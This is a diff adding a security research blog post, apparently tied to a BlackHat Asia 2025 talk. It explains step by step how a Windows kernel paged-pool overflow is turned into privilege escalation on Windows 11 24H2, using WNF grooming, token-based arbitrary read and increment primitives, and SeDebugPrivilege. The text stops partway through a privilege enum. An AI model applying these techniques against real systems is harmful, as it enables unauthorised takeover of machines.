@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta content="ie=edge" http-equiv="x-ua-compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+
+    <title>Porting a Windows Kernel data-only technique to 24H2 - VMCALL.IO</title>
+
+
+  <meta name="description" content="How we got a paged-pool exploit technique working under Windows 11 24H2"/>
+
+
+
+    <meta property="og:type" content="website"/>
+<meta property="og:url" content="http://localhost:4000/blog/2025-04-05-porting-to-24H2/"/>
+
+
+  <meta property="og:title" content="Porting a Windows Kernel data-only technique to 24H2"/>
+
+
+
+  <meta property="og:description" content="How we got a paged-pool exploit technique working under Windows 11 24H2"/>
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/gen/blog/bluescreen_prev.png"/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:site" content="" />
+<meta name="twitter:creator" content="" />
+    <link rel="alternate" type="application/atom+xml" title="VMCALL.IO" href="/feed.xml">
+    <link rel="icon" href="/assets/images/favicon/favicon.png">
+
+
+    <link href="/assets/css/main.css" rel="stylesheet">
+
+    
+      <script>
+          localStorage.getItem('darkMode') === 'true' && document.documentElement.setAttribute('data-bs-theme', 'dark');
+      </script>
+    
+
+    
+      <!-- https://github.com/orestbida/cookieconsent -->
+
+<link rel="stylesheet" href="/assets/css/cookieconsent.css">
+<script defer src="/assets/js/cookieconsent.js"></script>
+
+<!-- Inline script -->
+<script>
+    window.addEventListener('load', function () {
+
+        // obtain plugin
+        var cc = initCookieConsent();
+
+        // run plugin with your configuration
+        cc.run({
+            current_lang: 'en',
+            autoclear_cookies: true,                   // default: false
+            page_scripts: true,                        // default: false
+
+            // mode: 'opt-in'                          // default: 'opt-in'; value: 'opt-in' or 'opt-out'
+            // delay: 0,                               // default: 0
+            // auto_language: '',                      // default: null; could also be 'browser' or 'document'
+            // autorun: true,                          // default: true
+            // force_consent: false,                   // default: false
+            // hide_from_bots: true,                   // default: true
+            // remove_cookie_tables: false             // default: false
+            // cookie_name: 'cc_cookie',               // default: 'cc_cookie'
+            // cookie_expiration: 182,                 // default: 182 (days)
+            // cookie_necessary_only_expiration: 182   // default: disabled
+            // cookie_domain: location.hostname,       // default: current domain
+            // cookie_path: '/',                       // default: root
+            // cookie_same_site: 'Lax',                // default: 'Lax'
+            // use_rfc_cookie: false,                  // default: false
+            // revision: 0,                            // default: 0
+
+            onFirstAction: function (user_preferences, cookie) {
+                // callback triggered only once on the first accept/reject action
+            },
+
+            onAccept: function (cookie) {
+                // callback triggered on the first accept/reject action, and after each page load
+            },
+
+            onChange: function (cookie, changed_preferences) { 
+                // If analytics category is disabled => disable google analytics 
+                if (!cc.allowedCategory('analytics')) { 
+                    typeof gtag === 'function' && gtag('consent', 'update', { 
+                        'analytics_storage': 'denied' 
+                    }); 
+                } 
+            }, 
+
+            languages: {
+                'en': {
+                    consent_modal: {
+                        title: 'We use cookies!',
+                        description: 'Hi, this website uses essential cookies to ensure its proper operation and tracking cookies to understand how you interact with it. The latter will be set only after consent. <button type="button" data-cc="c-settings" class="cc-link">Let me choose</button>',
+                        primary_btn: {
+                            text: 'Accept all',
+                            role: 'accept_all'              // 'accept_selected' or 'accept_all'
+                        },
+                        secondary_btn: {
+                            text: 'Reject all',
+                            role: 'accept_necessary'        // 'settings' or 'accept_necessary'
+                        }
+                    },
+                    settings_modal: {
+                        title: 'Cookie preferences',
+                        save_settings_btn: 'Save settings',
+                        accept_all_btn: 'Accept all',
+                        reject_all_btn: 'Reject all',
+                        close_btn_label: 'Close',
+                        // cookie_table_caption: 'Cookie list',
+                        cookie_table_headers: [
+                            { col1: 'Name' },
+                            { col2: 'Domain' },
+                            { col3: 'Expiration' },
+                            { col4: 'Description' }
+                        ],
+                        blocks: [
+                            {
+                                title: 'Cookie usage 📢',
+                                description: 'I use cookies to ensure the basic functionalities of the website and to enhance your online experience. You can choose for each category to opt-in/out whenever you want. For more details relative to cookies and other sensitive data, please read the full <a href="#" class="cc-link">privacy policy</a>.'
+                            }, {
+                                title: 'Strictly necessary cookies',
+                                description: 'These cookies are essential for the proper functioning of my website. Without these cookies, the website would not work properly',
+                                toggle: {
+                                    value: 'necessary',
+                                    enabled: true,
+                                    readonly: true          // cookie categories with readonly=true are all treated as "necessary cookies"
+                                }
+                            }, {
+                                title: 'Performance and Analytics cookies',
+                                description: 'These cookies allow the website to remember the choices you have made in the past',
+                                toggle: {
+                                    value: 'analytics',     // your cookie category
+                                    enabled: false,
+                                    readonly: false
+                                },
+                                cookie_table: [             // list of all expected cookies
+                                    {
+                                        col1: '^_ga',       // match all cookies starting with "_ga"
+                                        col2: 'google.com',
+                                        col3: '2 years',
+                                        col4: 'description ...',
+                                        is_regex: true
+                                    },
+                                    {
+                                        col1: '_gid',
+                                        col2: 'google.com',
+                                        col3: '1 day',
+                                        col4: 'description ...',
+                                    }
+                                ]
+                            },
+                            {
+                                title: 'More information',
+                                description: 'For any queries in relation to our policy on cookies and your choices, please <a class="cc-link" href="#yourcontactpage">contact us</a>.',
+                            }
+                        ]
+                    }
+                }
+            }
+        });
+    });
+</script>
+    
+
+    
+
+    <link href="/assets/css/fonts.css" rel="stylesheet">
+
+
+
+
+    
+
+  </head>
+<body class="page page-post page-post-1 has-static-header">
+
+
+<div class="menu-main-mobile " id="menu-main-mobile">
+  
+  <div class="menu-main-mobile-top">
+    <div id="close-overlay" class="menu-main-close">
+      <div class="hamburger"></div>
+    </div>
+  </div>
+
+  <div class="menu-main-mobile-center">
+    
+      <ul class="menu">
+        
+          <li class="menu-item-home">
+            <a href="/">Home</a>
+          </li>
+        
+          <li class="menu-item-blog">
+            <a href="/blog/">Blog</a>
+          </li>
+        
+          <li class="menu-item-about">
+            <a href="/about/">About</a>
+          </li>
+        
+      </ul>
+    
+  </div>
+
+  <div class="menu-main-mobile-bottom">
+    
+      
+
+<div class="social" id="social">
+  
+  <a href="https://xoreax.bsky.social/" target="blank" title="Bluesky">
+    <i class="fab fa-twitter"></i>
+  </a>
+  
+  <a href="https://github.com/0xFDFDFDFD" target="blank" title="Github">
+    <i class="fab fa-github"></i>
+  </a>
+  
+  <a href="https://blog.vmcall.io/feed.xml" target="blank" title="RSS">
+    <i class="fas fa-feed"></i>
+  </a>
+  
+</div>
+
+
+    
+    
+  </div>
+
+</div>
+
+
+
+
+<div id="header" class='header '>
+  <div class="container">
+    <div class="logos">
+  <div class="logo logo-desktop">
+    
+      <div class="logo-image">
+        <a href="/">
+          <img height="30px" width="30px" alt="VMCALL.IO Logo" src="/assets/images/logo_clear.png"/>
+        </a>
+      </div>
+    
+  
+    
+      <div class="logo-text"><a href="/">VMCALL.IO</a></div>
+    
+    
+  </div>
+
+  <div class="logo logo-desktop-invert">
+    
+    
+      <div class="logo-image">
+        <a href="/">
+          <img height="30px" width="30px" alt="VMCALL.IO Logo" src="/assets/images/logo_clear.png"/>
+        </a>
+      </div>
+    
+  
+    
+      <div class="logo-text"><a href="/">VMCALL.IO</a></div>
+    
+    
+  </div>
+
+  <div class="logo logo-mobile">
+    
+    
+      <div class="logo-image">
+        <a href="/">
+          <img height="28px" width="28px" alt="VMCALL.IO Logo" src="/assets/images/logo_clear.png"/>
+        </a>
+      </div>
+    
+  
+    
+    
+  </div>
+
+
+  <div class="logo logo-mobile-invert">
+    
+    
+      <div class="logo-image">
+        <a href="/">
+          <img height="28px" width="28px" alt="VMCALL.IO Logo" src="/assets/images/logo_clear.png"/>
+        </a>
+      </div>
+    
+  
+    
+
+  </div>
+
+</div>
+
+
+    <div class="menu-main">
+  <ul>
+    
+      
+        
+        <li class=" ">
+          <a href="/" >Home</a>
+        </li>
+      
+    
+      
+        
+        <li class=" ">
+          <a href="/blog/" >Blog</a>
+        </li>
+      
+    
+      
+        
+        <li class=" ">
+          <a href="/about/" >About</a>
+        </li>
+      
+    
+  </ul>
+</div>
+
+    
+    <div class="hamburger-trigger" id="toggle-menu-main-mobile">
+  <button class="hamburger">Menu</button>
+</div>
+  </div>
+</div>
+
+<div id="wrapper" class="wrapper">     
+  <div class="section">
+  <div class="container post-header">
+
+    <div class="row justify-content-center">
+      <div class="col-12 col-lg-8">
+          
+            <div class="post-date">04 April 2025</div>
+          
+          
+          <div class="post-categories">
+          
+
+
+  
+    
+
+
+
+
+<div class="category-link">
+<a href="/category/exploit-development">
+  Exploit Development
+</a>
+
+</div>
+  
+    
+
+
+
+
+<div class="category-link">
+<a href="/category/windows-kernel">
+  Windows Kernel
+</a>
+
+</div>
+  
+
+          
+          </div>
+          <div class="post-title">
+            <h1>Porting a Windows Kernel data-only technique to 24H2</h1>
+          </div>
+          
+            <div class="post-description">
+              <p>How we got a paged-pool exploit technique working under Windows 11 24H2</p>
+            </div>
+          
+
+          
+            <div class="post-authors">
+              
+              
+              
+              
+
+
+
+
+<div class="author">
+  
+  <div class="author-image">
+    <img src="/assets/images/team/nicola.jpg" alt="Nicola" />
+  </div>
+  
+
+  
+  <div class="author-content">
+    <div class="author-name">Nicola</div>
+    
+    <div class="author-job">Security Researcher or something</div>
+    
+  </div>
+  
+</div>
+              
+            </div>
+          
+
+      </div>
+    </div>
+          
+    <div class="row justify-content-center">
+      <div class="col-12 col-lg-8">
+        
+          <div class="post-image">
+            <img src="/assets/images/gen/blog/bluescreen_prev.png" alt="Porting a Windows Kernel data-only technique to 24H2" />
+          </div>
+        
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="section pt-0">
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-12 col-lg-8">
+        <div class="content"><p>This research was part of my presentation at <a href="https://www.blackhat.com/asia-25/briefings/schedule/#misadventures-with-copilot-attacking-and-exploiting-windows-npu-drivers-43619">BlackHat Asia 2025</a>. We will present our general exploitation strategy on how we used
+an integer overflow turned out-of-bounds write (CVE-2024-36336) on the paged pool to escalate our privileges on the latest Windows 11 version 24H2. In this blogpost we will focus on the exploitation strategy not on the bugs themselves. The bugs could be the content of a later blogpost… Maybe…</p>
+
+<h2 id="tldr">TL;DR</h2>
+<p>We largely followed the method described by k0shl in his writeup about <a href="https://whereisk0shl.top/post/break-me-out-of-sandbox-in-old-pipe-cve-2022-22715-windows-dirty-pipe">CVE-2022-22715 Windows Dirty Pipe</a> (Amazing blog post read it!).
+With Windows 11 version 24H2 the bug around <code class="language-plaintext highlighter-rouge">previousMode</code> which was often used for <a href="https://www.nccgroup.com/us/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/">better read/write primitives</a> was fixed.
+As the write primitive which k0shl used had side effects, we had to replace it with something else. We used a reference counter at offset 0x18 of <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;BnoIsolationHandlesEntry</code> to gain an arbitrary increment primitive when we duplicate a <code class="language-plaintext highlighter-rouge">_TOKEN</code> object.
+The increment primitive only works if the value to increment is within the range <code class="language-plaintext highlighter-rouge">0x1 - 0x7ffffffffffffffff</code> otherwise, you get to enjoy a bluescreen.
+This primitive was then used to enable the <code class="language-plaintext highlighter-rouge">SeDebug</code> privilege in the <code class="language-plaintext highlighter-rouge">_TOKEN</code> object of the current  <code class="language-plaintext highlighter-rouge">_EPROCESS</code> and thus escalating our privileges. As a little bonus when you close the duplicated <code class="language-plaintext highlighter-rouge">_TOKEN</code> objects your privileges will be automatically be dropped again.</p>
+
+<h2 id="intro">Intro</h2>
+<p>So lets start at the beginning. Our exploitation strategy looks something like this:</p>
+<ol>
+  <li>Create a predictable heaplayout (Fengshui)</li>
+  <li>Overwrite a <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> object</li>
+  <li>Put a <code class="language-plaintext highlighter-rouge">_TOKEN</code> object behind our <code class="language-plaintext highlighter-rouge">_WNF_DATA</code> object</li>
+  <li>Establish arbitrary read</li>
+  <li>Use arbitrary increment</li>
+  <li>???</li>
+  <li>Profit</li>
+</ol>
+
+<h2 id="wtf-is-wnf">WTF is WNF?</h2>
+
+<p>Before we start with our fengshui we have to talk about  <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> objects. This will be the object we will primarly use for our fengshui. Think about it like a swiss army knife for paged pool exploitation. Lets have a look at the object:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_WNF_STATE_DATA</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">_WNF_NODE_HEADER</span> <span class="n">Header</span><span class="p">;</span>             <span class="c1">//0x0</span>
+    <span class="n">ULONG</span> <span class="n">AllocatedSize</span><span class="p">;</span>                        <span class="c1">//0x4</span>
+    <span class="n">ULONG</span> <span class="n">DataSize</span><span class="p">;</span>                             <span class="c1">//0x8</span>
+    <span class="n">ULONG</span> <span class="n">ChangeStamp</span><span class="p">;</span>                          <span class="c1">//0xc</span>
+    <span class="n">UCHAR</span> <span class="n">UserData</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>                          <span class="c1">//Up to 0x1000</span>
+<span class="p">};</span> 
+</code></pre></div></div>
+<p>As seen by the last member of this struct the <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> has a dynamic size. So we can write up to 0x1000 bytes of user controlled data. This means we exactly know how big our <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> object will be. Additonally <code class="language-plaintext highlighter-rouge">AllocatedSize</code> and <code class="language-plaintext highlighter-rouge">DataSize</code> will be set to the size of our <code class="language-plaintext highlighter-rouge">UserData</code>. With an overflow we can now overwrite <code class="language-plaintext highlighter-rouge">AllocatedSize</code> and <code class="language-plaintext highlighter-rouge">DataSize</code> to an value bigger than the actual <code class="language-plaintext highlighter-rouge">UserData</code>. Now we can use the APIs <code class="language-plaintext highlighter-rouge">NtQueryWnfStateData</code> and <code class="language-plaintext highlighter-rouge">NtUpdateWnfStateData</code> to linearly read and write out of bounds of our <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> allocation.</p>
+
+<p>More specifically if you  overwrite <code class="language-plaintext highlighter-rouge">AllocatedSize</code> you can write out of bounds up to the specified value or to a maximum of 0x1000. Fun fact you can overwrite <code class="language-plaintext highlighter-rouge">AllocatedSize</code> with a size bigger than 0x1000 and you will still be able to write up to 0x1000 bytes.</p>
+
+<p><code class="language-plaintext highlighter-rouge">DataSize</code> on the other hand, controls how much we can read. Here we are not limited to 0x1000 bytes but you always need to read the entire buffer. So if you overwrite this field with 0xffffff you have to read all 0xffffff bytes. If you read a page which is not paged in, this will lead to a crash. So don’t use huge numbers here. You can also use this property to your advantage. You can query all sprayed <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> objects with an buffer of similar size as the original one and the one which returns <code class="language-plaintext highlighter-rouge">STATUS_BUFFER_TOO_SMALL</code> is the object where <code class="language-plaintext highlighter-rouge">AllocatedSize</code> got corrupted.</p>
+
+<p>We can create a <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> object with a call to <code class="language-plaintext highlighter-rouge">NtCreateWnfStateName</code> and <code class="language-plaintext highlighter-rouge">NtUpdateWnfStateData</code>. As detailed in k0shls blog in the section <code class="language-plaintext highlighter-rouge">Demonstrate how I use WNF API with a accessible SD</code>.</p>
+
+<h2 id="fengshui">Fengshui</h2>
+<p>Enough nerding about <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> it is time to make our paged pool layout predictable. There are a few sources on how the windows kernel allocator works like <a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf">this</a> or <a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">this</a>. I mainly used the second <a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">source</a>.</p>
+
+<p>The hardest part about the fengshui was choosing the size and which allocator we want to use. We choose the <code class="language-plaintext highlighter-rouge">Variable Size</code> allocator. Our fengshui has three different objects.</p>
+
+<ol>
+  <li>The object which will trigger the overflow (See our <a href="https://www.blackhat.com/asia-25/briefings/schedule/#misadventures-with-copilot-attacking-and-exploiting-windows-npu-drivers-43619">BH presentation</a>). It has an dynamic size.</li>
+  <li><code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> &lt;3</li>
+  <li>A <code class="language-plaintext highlighter-rouge">_TOKEN</code> object</li>
+</ol>
+
+<p>Luckily the only object where we don’t control the size of is the <code class="language-plaintext highlighter-rouge">_TOKEN</code> object. Interestingly the <code class="language-plaintext highlighter-rouge">_TOKEN</code> object is not a fixed allocation but the size can vary depending on what is stored inside the <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;DynamicPart</code> (DACL and stuff I think, but I’m not 100% sure). For us our <code class="language-plaintext highlighter-rouge">_TOKEN</code> objects we will spray had a size around 0x7c0.
+So we adjusted our <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> and our vulnerable object to the same size.</p>
+
+<p>Then our strategy was the following:</p>
+<ol>
+  <li>Spray enough <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> to fill up all existing holes to get the allocations continous and enable <code class="language-plaintext highlighter-rouge">dynamic lookaside</code> for this allocation size.</li>
+  <li>Free one <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code></li>
+  <li>Trigger the allocation of our vulnerable object and overflow AllocatedSize and parts of DataSize inside a <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code></li>
+  <li>Use the <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> object to overwrite AllocatedSize and DataSize of the next <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> with better values</li>
+  <li>Replace the not corrupted <code class="language-plaintext highlighter-rouge">_WNF_STATE_DATA</code> objects with  <code class="language-plaintext highlighter-rouge">_TOKEN</code> objects</li>
+  <li>Enjoy the full control over a <code class="language-plaintext highlighter-rouge">_TOKEN</code> object</li>
+</ol>
+
+<p>Visualized it looks something like this:</p>
+<figure>
+  <a href="" target="">
+    <img src="/assets/images/gen/content/fengshui.jpg" alt="Photo of the fengshui" />
+  </a>
+  <figcaption>
+    <h4>Fengshui visualized, AS: Allocated Size and DS: Data Size</h4>
+    <p></p>
+  </figcaption>
+</figure>
+<h2 id="establish-arbitrary-read">Establish arbitrary read</h2>
+<p>After a reliable linear read/write primitive was established we wanted arbitrary read. To establish an arbitrary read we can modify the <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;BnoIsolationHandlesEntry</code> and point it to a controlled userspace address (see once again <a href="https://whereisk0shl.top/post/break-me-out-of-sandbox-in-old-pipe-cve-2022-22715-windows-dirty-pipe">k0shls blog</a>). At this userspace address we can now forge a <code class="language-plaintext highlighter-rouge">_SEP_CACHED_HANDLES_ENTRY</code>. The <code class="language-plaintext highlighter-rouge">EntryDescriptor.IsolationPrefix.Buffer</code> at offset 0x30 can be pointed to the kernel address we want to read. And <code class="language-plaintext highlighter-rouge">EntryDescriptor.IsolationPrefix.MaximumLength</code> at offset 0x28 defines how much bytes will be read.</p>
+
+<figure>
+  <a href="" target="">
+    <img src="/assets/images/gen/content/arbitraryr.png" alt="Photo illustrating the arbitrary read setup" />
+  </a>
+  <figcaption>
+    <h4>Simple illustration of the arbitrary read setup</h4>
+    <p></p>
+  </figcaption>
+</figure>
+
+<p>After we setup our <code class="language-plaintext highlighter-rouge">_SEP_CACHED_HANDLES_ENTRY</code> in userspace we can simply call <code class="language-plaintext highlighter-rouge">NtQueryInformationToken</code> with a handle to our corrupted token and set the <code class="language-plaintext highlighter-rouge">TokenInformationClass</code> to <code class="language-plaintext highlighter-rouge">TokenBnoIsolation</code>. At offset 0x10 of the returning buffer you will find your data (So make the input buffer 0x10 bytes bigger than <code class="language-plaintext highlighter-rouge">EntryDescriptor.IsolationPrefix.MaximumLength</code>).</p>
+
+<h3 id="what-should-we-read">What should we read?</h3>
+<p>Chen Le Qi from Starlabs documented in a <a href="https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictive-chunk-size-cve-2021-31969/#hunting-eprocess">blogpost</a> from 2023 how we can find the <code class="language-plaintext highlighter-rouge">_EPROCESS</code> structure of our current process from the <code class="language-plaintext highlighter-rouge">_TOKEN</code> object we control. It still works in 24H2!</p>
+
+<p>I summarize this strategy shortly:</p>
+
+<ol>
+  <li>Search the page containing the <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;SessionObject</code>
+of our current Token for an allocation with the tag
+<code class="language-plaintext highlighter-rouge">AlIn</code></li>
+  <li>Read the pointer at offset 0x38 as it contains an IoCompletion object</li>
+  <li>Search the page containing the IoCompletion object
+for an allocation with the tag <code class="language-plaintext highlighter-rouge">EtwR</code>.</li>
+  <li>Read the pointer at offset 0x30 as it contains an
+<code class="language-plaintext highlighter-rouge">_EPROCESS</code> object</li>
+  <li>Iterate over the <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> linked list of the
+<code class="language-plaintext highlighter-rouge">_EPROCESS</code> to find our own <code class="language-plaintext highlighter-rouge">_EPROCESS</code> object by
+comparing the UniqueProcessId field to our current
+process id.</li>
+</ol>
+
+<h3 id="why-we-need-_eprocess">Why we need <code class="language-plaintext highlighter-rouge">_EPROCESS</code>?</h3>
+<p>Because the <code class="language-plaintext highlighter-rouge">_EPROCESS</code> has again a pointer to the currently used <code class="language-plaintext highlighter-rouge">_TOKEN</code> which contains the privileges held of our current process. If we can change the fields <code class="language-plaintext highlighter-rouge">_TOKEN.Privileges.Present</code> and <code class="language-plaintext highlighter-rouge">_TOKEN.Privileges.Enabled</code> in the <code class="language-plaintext highlighter-rouge">_TOKEN</code> of our current process,  we can enable powerful <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">SE_Privileges</a>. Those privileges are allowing us to bypass a lot of security checks. For example with <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> we can obtain a handle with full rights to the <code class="language-plaintext highlighter-rouge">winlogon.exe</code> process and spawn a subprocess with it.</p>
+
+<h3 id="what-if-i-am-an-_eprocess-hater">What if I am an <code class="language-plaintext highlighter-rouge">_EPROCESS</code> hater?</h3>
+<p>That is a bit wierd, but we don’t judge. Luckily for you Angelboy presented at Hexxacon 2024 a different way to escalate your privileges. You have to locate the symbol <code class="language-plaintext highlighter-rouge">nt!SeDebugPrivilege</code> and later increment the value there to the value of a privilege you are currently holding. So instead of <code class="language-plaintext highlighter-rouge">_EPROCESS</code> you have to locate the <code class="language-plaintext highlighter-rouge">nt</code> base address. Check his <a href="https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/">blogpost</a> for more details. He was also an inspiration for using an arbitrary increment as a primitive later.</p>
+
+<h2 id="arbitrary-increment">Arbitrary increment</h2>
+<h3 id="rip-previousmode">RIP previousMode</h3>
+<p>So Microsoft killed the <a href="https://www.nccgroup.com/us/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-2/">previousMode technique</a> with 24H2.</p>
+<figure>
+  <a href="" target="">
+    <img src="/assets/images/gen/content/congrats.png" alt="Photo of an upset child congratulating" />
+  </a>
+  <figcaption>
+    <h4>My reaction to this amazing achievement...</h4>
+    <p></p>
+  </figcaption>
+</figure>
+<p>K0shls technique for arbitrary write described in his blog had some sideeffects. It messed up values surrounding the value we wrote. This was not a problem when we simply could set the <code class="language-plaintext highlighter-rouge">previousMode</code> to 0 and then use <code class="language-plaintext highlighter-rouge">NtReadVirtualMemory</code> and <code class="language-plaintext highlighter-rouge">NtWriteVirtualMemory</code> to clean up the stuff
+we messed up. But we couldn’t get it working anymore :(</p>
+
+<h3 id="misusing-reference-counters">(Mis)using reference counters</h3>
+<p>As the awesome <code class="language-plaintext highlighter-rouge">previousMode</code> trick was gone, we had to find a different way to enable <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> for our process. As we only need to flip a bit inside the fields  <code class="language-plaintext highlighter-rouge">_TOKEN.Privileges.Present</code> and <code class="language-plaintext highlighter-rouge">_TOKEN.Privileges.Enabled</code> we realized an stable arbitrary increment would suffice. After checking the <code class="language-plaintext highlighter-rouge">_TOKEN</code> object we realized that our good old friend <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;BnoIsolationHandlesEntry</code> has the following type:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_SEP_CACHED_HANDLES_ENTRY</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">_RTL_DYNAMIC_HASH_TABLE_ENTRY</span> <span class="n">HashEntry</span><span class="p">;</span>                <span class="c1">//0x0</span>
+    <span class="n">LONGLONG</span> <span class="n">ReferenceCount</span><span class="p">;</span>                                       <span class="c1">//0x18 &lt;-- looking promising</span>
+    <span class="k">struct</span> <span class="n">_SEP_CACHED_HANDLES_ENTRY_DESCRIPTOR</span> <span class="n">EntryDescriptor</span><span class="p">;</span>   <span class="c1">//0x20</span>
+    <span class="n">ULONG</span> <span class="n">HandleCount</span><span class="p">;</span>                                             <span class="c1">//0x38</span>
+    <span class="n">VOID</span><span class="o">**</span> <span class="n">Handles</span><span class="p">;</span>                                                <span class="c1">//0x40</span>
+<span class="p">};</span> 
+</code></pre></div></div>
+<p>At offset 0x18 there is an ReferenceCount counter which could be abused as an increment primitive. Because if we could duplicate a <code class="language-plaintext highlighter-rouge">_TOKEN</code> and only the 
+field <code class="language-plaintext highlighter-rouge">ReferenceCount</code> gets changed we would be back in the game!</p>
+<figure>
+  <a href="" target="">
+    <img src="/assets/images/gen/content/arbitraryinc.jpg" alt="Photo illustrating the arbitrary increment" />
+  </a>
+  <figcaption>
+    <h4>Arbitrary increment with BnoIsolationHandlesEntry</h4>
+    <p></p>
+  </figcaption>
+</figure>
+
+<p>So lets check it out in Binary Ninja:</p>
+<figure>
+  <a href="" target="">
+    <img src="/assets/images/gen/content/inc_token.png" alt="Photo of the increment" />
+  </a>
+  <figcaption>
+    <h4>Increment during SepDuplicateToken</h4>
+    <p></p>
+  </figcaption>
+</figure>
+<p>So if we duplicate a <code class="language-plaintext highlighter-rouge">_TOKEN</code> and <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;BnoIsolationHandlesEntry</code> is set and the <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;BnoIsolationHandlesEntry.ReferenceCount</code> is not <code class="language-plaintext highlighter-rouge">0</code> and less than <code class="language-plaintext highlighter-rouge">0x7ffffffffffffffff</code>, only the <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;BnoIsolationHandlesEntry.ReferenceCount</code> is changed. Perfect!</p>
+
+<p>We also should verify the decrement:</p>
+<figure>
+  <a href="" target="">
+    <img src="/assets/images/gen/content/dec_token.png" alt="Photo of the decrement" />
+  </a>
+  <figcaption>
+    <h4>Decrement when a _TOKEN handle is closed</h4>
+    <p></p>
+  </figcaption>
+</figure>
+<p>As long as the value doesn’t get decremented to <code class="language-plaintext highlighter-rouge">0</code> (Which would try to free the <code class="language-plaintext highlighter-rouge">_SEP_CACHED_HANDLES_ENTRY</code>) we should be fine.</p>
+
+<p>Good life!</p>
+
+<p>If we look at the <code class="language-plaintext highlighter-rouge">Present</code> and <code class="language-plaintext highlighter-rouge">Enabled</code> fields of an process token running in low integrity:</p>
+<figure>
+  <a href="" target="">
+    <img src="/assets/images/gen/content/lowintegrity_token.png" alt="Photo of the privilege struct in a low integrity process" />
+  </a>
+  <figcaption>
+    <h4>The privilege struct of an low integrity process</h4>
+    <p></p>
+  </figcaption>
+</figure>
+<p>The values are between <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">0x7ffffffffffffffff</code>. Perfect!</p>
+
+<p>As a bonus when we don’t need <code class="language-plaintext highlighter-rouge">SeDebugPrivilege</code> anymore, we can simply close the handles to our duplicated tokens and it will drop our privileges again.</p>
+
+<h3 id="calculations">Calculations</h3>
+<p>But how many times do we need to duplicate our modified <code class="language-plaintext highlighter-rouge">_TOKEN</code> and where do we have to point <code class="language-plaintext highlighter-rouge">_TOKEN-&gt;BnoIsolationHandlesEntry.ReferenceCount</code> to?
+Lets first have a closer look at <code class="language-plaintext highlighter-rouge">SE_Privileges</code>. We created a struct with some of the most important <code class="language-plaintext highlighter-rouge">SE_Privileges</code>:</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">enum</span> <span class="n">_PRIVS</span>
+<span class="p">{</span>
+	<span class="n">unk</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
+	<span class="n">unk2</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
+	<span class="n">SeCreateTokenPrivilege</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">,</span>
+	<span class="n">SeAssignPrimaryTokenPrivilege</span> <span class="o">=</span> <span class="mh">0x3</span><span class="p">,</span>
+	<span class="n">SeLockMemoryPrivilege</span> <span class="o">=</span> <span class="mh">0x4</span><span class="p">,</span>
+	<span class="n">SeIncreaseQuotaPrivilege</span> <span class="o">=</span> <span class="mh">0x5</span><span class="p">,</span>
+	<span class="n">SeUnsolicitedInputPrivilege</span> <span class="o">=</span> <span class="mh">0x6</span><span class="p">,</span>
+	<span class="n">SeTcbPrivilege</span> <span class="o">=</span> <span class="mh">0x7</span><span class="p">,</span>
+	<span class="n">SeSecurityPrivilege</span> <span class="o">=</span> <span class="mh">0x8</span><span class="p">,</span>
